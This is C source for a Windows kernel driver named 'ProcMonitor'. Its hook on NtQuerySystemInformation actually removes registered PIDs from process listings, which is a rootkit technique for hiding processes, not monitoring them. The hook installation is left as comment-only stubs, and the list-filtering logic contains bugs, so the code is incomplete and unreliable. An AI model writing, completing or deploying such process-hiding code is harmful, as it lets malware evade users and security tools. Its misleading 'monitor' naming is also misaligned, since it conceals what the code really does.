#include <ntddk.h>
#include <wdf.h>

#define IOCTL_MONITOR_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define DRIVER_TAG 'tagD'

typedef struct _MONITOR_PROCESS_REQUEST {
    ULONG Pid;
} MONITOR_PROCESS_REQUEST, *PMONITOR_PROCESS_REQUEST;

DRIVER_INITIALIZE DriverEntry;
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath);
NTSTATUS CreateCloseHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
NTSTATUS DeviceIoControlHandler(_In_ PDEVICE_OBJECT DeviceObject, _In_ PIRP Irp);
void HookProcessEnumeration(void);
void UnhookProcessEnumeration(void);
void MonitorProcessCreation(ULONG ProcessId);

static PVOID OriginalNtQuerySystemInformation = NULL;
static LIST_ENTRY MonitoredProcessesList;
static KSPIN_LOCK MonitoredProcessesListLock;

typedef struct _MONITORED_PROCESS {
    ULONG Pid;
    LIST_ENTRY ListEntry;
} MONITORED_PROCESS, *PMONITORED_PROCESS;

typedef NTSTATUS(*PFN_NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

NTSTATUS HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

void DriverUnload(_In_ PDRIVER_OBJECT DriverObject);

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS Status;
    PDEVICE_OBJECT DeviceObject = NULL;
    UNICODE_STRING DeviceName;
    UNICODE_STRING SymbolicLink;

    RtlInitUnicodeString(&DeviceName, L"\\Device\\ProcMonitor");
    RtlInitUnicodeString(&SymbolicLink, L"\\DosDevices\\ProcMonitor");

    Status = IoCreateDevice(
        DriverObject,
        0,
        &DeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &DeviceObject);

    if (!NT_SUCCESS(Status)) {
        return Status;
    }

    Status = IoCreateSymbolicLink(&SymbolicLink, &DeviceName);
    if (!NT_SUCCESS(Status)) {
        IoDeleteDevice(DeviceObject);
        return Status;
    }

    DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceIoControlHandler;
    DriverObject->DriverUnload = DriverUnload;

    InitializeListHead(&MonitoredProcessesList);
    KeInitializeSpinLock(&MonitoredProcessesListLock);

    HookProcessEnumeration();

    return STATUS_SUCCESS;
}

NTSTATUS CreateCloseHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DeviceIoControlHandler(
    _In_ PDEVICE_OBJECT DeviceObject,
    _In_ PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp);
    NTSTATUS Status = STATUS_INVALID_PARAMETER;

    if (IoStackLocation->Parameters.DeviceIoControl.IoControlCode == IOCTL_MONITOR_PROCESS) {
        PMONITOR_PROCESS_REQUEST Request = (PMONITOR_PROCESS_REQUEST)Irp->AssociatedIrp.SystemBuffer;
        PMONITORED_PROCESS MonitoredProcess;

        MonitoredProcess = (PMONITORED_PROCESS)ExAllocatePoolWithTag(NonPagedPool, sizeof(MONITORED_PROCESS), DRIVER_TAG);
        if (MonitoredProcess) {
            MonitoredProcess->Pid = Request->Pid;
            KIRQL OldIrql;
            KeAcquireSpinLock(&MonitoredProcessesListLock, &OldIrql);
            InsertTailList(&MonitoredProcessesList, &MonitoredProcess->ListEntry);
            KeReleaseSpinLock(&MonitoredProcessesListLock, OldIrql);

            Status = STATUS_SUCCESS;
        } else {
            Status = STATUS_INSUFFICIENT_RESOURCES;
        }
    }

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return Status;
}

void DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    UNICODE_STRING SymbolicLink;
    RtlInitUnicodeString(&SymbolicLink, L"\\DosDevices\\ProcMonitor");

    UnhookProcessEnumeration();

    IoDeleteSymbolicLink(&SymbolicLink);
    IoDeleteDevice(DriverObject->DeviceObject);

    KIRQL OldIrql;
    PLIST_ENTRY Entry, TempEntry;
    KeAcquireSpinLock(&MonitoredProcessesListLock, &OldIrql);

    Entry = MonitoredProcessesList.Flink;
    while (Entry != &MonitoredProcessesList) {
        TempEntry = Entry->Flink;
        ExFreePoolWithTag(CONTAINING_RECORD(Entry, MONITORED_PROCESS, ListEntry), DRIVER_TAG);
        Entry = TempEntry;
    }

    KeReleaseSpinLock(&MonitoredProcessesListLock, OldIrql);
}

NTSTATUS HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength)
{
    NTSTATUS Status = ((PFN_NtQuerySystemInformation)OriginalNtQuerySystemInformation)(
        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == SystemProcessInformation && NT_SUCCESS(Status)) {
        PVOID CurrentProcessInfo = SystemInformation;
        PVOID PreviousProcessInfo = NULL;
        PVOID NextProcessInfo = NULL;
        PSYSTEM_PROCESS_INFORMATION ProcessInfo = NULL;

        while (TRUE) {
            ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)CurrentProcessInfo;
            NextProcessInfo = (PUCHAR)CurrentProcessInfo + ProcessInfo->NextEntryOffset;

            if (ProcessInfo->NextEntryOffset == 0) {
                break;
            }

            KIRQL OldIrql;
            KeAcquireSpinLock(&MonitoredProcessesListLock, &OldIrql);

            PLIST_ENTRY Entry;
            BOOLEAN IsMonitored = FALSE;
            for (Entry = MonitoredProcessesList.Flink; Entry != &MonitoredProcessesList; Entry = Entry->Flink) {
                PMONITORED_PROCESS MonitoredProcess = CONTAINING_RECORD(Entry, MONITORED_PROCESS, ListEntry);
                if (ProcessInfo->UniqueProcessId == (HANDLE)MonitoredProcess->Pid) {
                    IsMonitored = TRUE;
                    break;
                }
            }

            KeReleaseSpinLock(&MonitoredProcessesListLock, OldIrql);

            if (IsMonitored) {
                if (PreviousProcessInfo) {
                    ((PSYSTEM_PROCESS_INFORMATION)PreviousProcessInfo)->NextEntryOffset += ProcessInfo->NextEntryOffset;
                } else {
                    RtlMoveMemory(CurrentProcessInfo, NextProcessInfo, SystemInformationLength - ((PUCHAR)CurrentProcessInfo - (PUCHAR)SystemInformation));
                }
            } else {
                PreviousProcessInfo = CurrentProcessInfo;
            }

            CurrentProcessInfo = NextProcessInfo;
        }
    }

    return Status;
}

void HookProcessEnumeration(void)
{
    UNICODE_STRING FunctionName;
    RtlInitUnicodeString(&FunctionName, L"NtQuerySystemInformation");
    OriginalNtQuerySystemInformation = (PVOID)MmGetSystemRoutineAddress(&FunctionName);

    if (OriginalNtQuerySystemInformation) {
        // Assuming you have a reliable way to write-protect the function pointer,
        // and you should hook it here safely.
        // Original function should be stored and restored later.
    }
}

void UnhookProcessEnumeration(void)
{
    // Assuming you have stored the original function pointer,
    // restore it safely here.
}
